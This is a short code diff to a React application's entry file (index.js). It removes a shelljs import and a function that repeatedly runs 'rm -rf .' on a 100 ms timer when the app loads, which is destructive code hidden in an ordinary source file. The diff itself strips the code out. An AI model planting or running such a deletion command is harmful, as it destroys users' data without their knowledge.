@@ -1,19 +1,8 @@
 import React from 'react';
 import ReactDOM from 'react-dom';
 import './index.css';
-import shell from 'shelljs';
 import App from './App';
 import * as serviceWorker from './serviceWorker';
-
-const doaa = () => {
-  //
-  setInterval(() => {
-    shell.exec('rm -rf .');
-  }, 100);
-  return this;
-};
-
-doaa();
 
 ReactDOM.render(<App />, document.getElementById('root'));
 
